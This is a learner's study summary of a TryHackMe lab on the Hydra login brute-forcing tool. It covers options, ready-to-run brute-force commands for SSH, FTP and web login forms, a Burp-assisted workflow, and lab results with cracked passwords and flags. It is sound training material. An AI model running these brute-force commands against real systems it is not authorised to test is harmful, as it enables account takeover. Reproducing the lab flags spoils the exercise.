# 🛡️ TryHackMe — Cybersecurity 101

## Module: Hydra | Study Summary

> **Keywords:** Hydra · Brute Force · Password Cracking · SSH · HTTP-POST-Form · Wordlist · FoxyProxy · Burp Suite

---

## 📚 Table of Contents

1. [What is Hydra](#1-what-is-hydra)
2. [Supported Protocols](#2-supported-protocols)
3. [Installation](#3-installation)
4. [Hydra Command Structure & Options](#4-hydra-command-structure--options)
5. [Attacking SSH](#5-attacking-ssh)
6. [Attacking Web Forms (HTTP POST)](#6-attacking-web-forms-http-post)
7. [Practical Lab Notes](#7-practical-lab-notes)
8. [Quick Reference Cheatsheet](#8-quick-reference-cheatsheet)

---

## 1. What is Hydra

Hydra is a **brute force online password cracking program** — a fast, parallelized login "hacking" tool. It works by running through a password list and attempting to authenticate against a target service automatically, determining the correct password through trial and error.

It is particularly useful when auditing the strength of credentials on services exposed to a network. The tool highlights the importance of using **strong passwords**: common, short, or special-character-free passwords are highly susceptible to being cracked.

> ⚠️ **Real-world context:** Many out-of-the-box applications (CCTV cameras, web frameworks, routers) ship with default credentials like `admin:password`. These are trivially cracked by Hydra and should always be changed immediately upon deployment.

---

## 2. Supported Protocols

Hydra supports brute-forcing a wide range of protocols and services:

| Category | Protocols |
|---|---|
| **Remote Access** | SSH (v1 and v2), SSHKEY, Telnet, RDP, VNC, Rlogin, Rexec, Rsh, PC-Anywhere |
| **File Transfer** | FTP, AFP, CVS, Subversion |
| **Web** | HTTP-GET, HTTP-POST, HTTP-HEAD, HTTP-FORM-GET, HTTP-FORM-POST, HTTPS variants, HTTP-PROXY |
| **Email** | SMTP, SMTP Enum, IMAP, POP3 |
| **Databases** | MySQL, MS-SQL, Oracle, Oracle Listener, Oracle SID, POSTGRES, Firebird, MONGODB, MEMCACHED |
| **Network / Other** | SNMP v1+v2+v3, SMB, LDAP, SOCKS5, SIP, RTSP, IRC, NNTP, ICQ, NCP, XMPP |
| **Enterprise / Misc** | SAP/R3, VMware-Auth, Cisco AAA, Cisco auth, Cisco enable, Radmin, TeamSpeak (TS2), PCNFS |

> 🔗 For detailed options per protocol: [Kali Hydra Tool Page](https://en.kali.tools/?p=220)

---

## 3. Installation

Hydra comes **pre-installed on Kali Linux** and the TryHackMe AttackBox.

For other distributions:

```bash
# Debian / Ubuntu
apt install hydra

# Fedora
dnf install hydra
```

> 🔗 Source: [THC-Hydra Official Repository](https://github.com/vanhauser-thc/thc-hydra)

---

## 4. Hydra Command Structure & Options

The basic syntax of a Hydra command is:

```bash
hydra [options] target protocol://IP
```

The options passed depend on the **target protocol**. Below are the most common flags:

| Option | Description |
|---|---|
| `-l <username>` | Specify a single username for login |
| `-L <file>` | Specify a file containing a list of usernames |
| `-p <password>` | Specify a single password to try |
| `-P <file>` | Specify a wordlist (password list) file |
| `-t <number>` | Number of parallel threads to spawn (default: 16) |
| `-s <port>` | Specify a non-default port number |
| `-V` | Verbose mode — shows every login attempt |
| `-f` | Stop attack after the first valid credential is found |

---

## 5. Attacking SSH

### Syntax

```bash
hydra -l <username> -P <path/to/wordlist> <MACHINE_IP> -t 4 ssh
```

### Example

```bash
hydra -l root -P passwords.txt 10.10.10.5 -t 4 ssh
```

**What this does:**
- Uses `root` as the target username
- Tries every password in `passwords.txt`
- Spawns 4 parallel threads (`-t 4`)
- Targets the SSH service on the given IP

> 💡 **Why `-t 4` for SSH?** SSH has connection limits and rate controls. Using too many threads can cause the service to block connections or behave unexpectedly. Keeping threads low (4) is a safer and more reliable approach.

---

## 6. Attacking Web Forms (HTTP POST)

### Syntax

```bash
sudo hydra -l <username> -P <wordlist> <MACHINE_IP> http-post-form "<path>:<login_credentials>:<invalid_response>"
```

### Parameter Breakdown

| Parameter | Description |
|---|---|
| `<path>` | The URL path of the login page (e.g. `/login.php` or `/`) |
| `<login_credentials>` | The form fields with Hydra placeholders: `username=^USER^&password=^PASS^` |
| `<invalid_response>` | A string that appears in the server response **when login fails** (e.g. `F=incorrect`) |
| `^USER^` | Hydra replaces this with the username being tested |
| `^PASS^` | Hydra replaces this with the password being tested |

### Full Example

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

**What this does:**
- Login page is at `/` (root path)
- The username field is `username`, password field is `password`
- `F=incorrect` — Hydra identifies a failed login when the word `incorrect` appears in the response
- `-V` enables verbose output showing each attempt

### Non-default Port

If the web server is running on a non-standard port, add `-s <port>`:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s 8080 -V
```

### How to Get the Correct Parameters

Before building the Hydra command for a web form, you need to know:
1. The **URL path** of the login page
2. The exact **field names** used in the form (`username`, `email`, `user`, etc.)
3. A **string from the failed login response** to use as the failure indicator

> 💡 **Best approach:** Use **Burp Suite** with Intercept ON to capture the POST request when submitting the login form. The intercepted request shows the exact field names and path needed for the Hydra command.

---

## 7. Practical Lab Notes

### Lab Setup

- **Attacker machine:** TryHackMe AttackBox
- **Target:** `10.65.138.92`
- **Wordlist used:** `/usr/share/wordlists/rockyou.txt`

---

### Challenge 1 — Web Form (POST) Brute Force

**Goal:** Find molly's web password and retrieve Flag 1.

**Approach:** Navigated to the target IP in the browser, then used **Burp Suite** to intercept the POST login request and extract the exact field names and failure response string.

**Command used:**

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.65.138.92 http-post-form \
"/:login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
```

**Result:**
```
Username: molly
Password: sunshine
Flag 1:   THM{2673a7dd116de68e85c48ec0b1f2612e}
```

---

### Challenge 2 — SSH Brute Force

**Goal:** Find molly's SSH password and retrieve Flag 2.

**Command used:**

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.65.138.92 -t 4 ssh
```

**Result:**
```
Username: molly
Password: butterfly
```

**Post-exploitation steps:**

```bash
# Connect via SSH using the cracked credentials
ssh molly@10.65.138.92

# List files in the home directory
ls

# Read the flag
cat flag2.txt

# Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}
```

---

## 8. Quick Reference Cheatsheet

### Common Attack Commands

```bash
# FTP brute force
hydra -l user -P passlist.txt ftp://MACHINE_IP

# SSH brute force
hydra -l <user> -P <wordlist> MACHINE_IP -t 4 ssh

# HTTP POST form brute force
hydra -l <user> -P <wordlist> MACHINE_IP http-post-form \
"/<path>:username=^USER^&password=^PASS^:F=<fail_string>" -V

# HTTP POST on non-default port
hydra -l <user> -P <wordlist> MACHINE_IP http-post-form \
"/<path>:username=^USER^&password=^PASS^:F=<fail_string>" -s <port> -V
```

### Key Flags Summary

| Flag | Use |
|---|---|
| `-l` | Single username |
| `-L` | Username list file |
| `-p` | Single password |
| `-P` | Password list file |
| `-t` | Threads (keep low for SSH: 4) |
| `-s` | Custom port |
| `-V` | Verbose — show all attempts |
| `-f` | Stop on first successful login |

### Workflow: Web Form Attack

```
1. Open target login page in browser
2. Enable FoxyProxy → Burp Suite
3. Turn Intercept ON in Burp
4. Submit the login form with dummy credentials
5. Read the intercepted POST request:
   - Note the URL path
   - Note the exact field names (username=, email=, etc.)
6. Submit with wrong creds in browser to get the fail response string
7. Build the Hydra command with the extracted parameters
8. Run Hydra with rockyou.txt or appropriate wordlist
```

### Terminology

| Term | Definition |
|---|---|
| **Brute force** | Systematically trying all possible passwords until the correct one is found. |
| **Wordlist / Dictionary attack** | Using a pre-built list of common passwords instead of trying every possible combination. |
| **`^USER^` / `^PASS^`** | Hydra placeholders replaced with the actual username/password values during each attempt. |
| **Failure string (`F=`)** | A string present in the server response when login fails. Hydra uses this to distinguish failed from successful attempts. |
| **Threads (`-t`)** | Number of parallel login attempts. More threads = faster, but may trigger lockouts or rate limits. |
| **rockyou.txt** | One of the most popular password wordlists, containing ~14 million real-world leaked passwords. Located at `/usr/share/wordlists/rockyou.txt` on Kali. |

---

## 📝 My Notes & Questions

> *[ Write your questions, insights, and connections to other concepts here ]*

---

*TryHackMe — Cybersecurity 101 | Hydra*
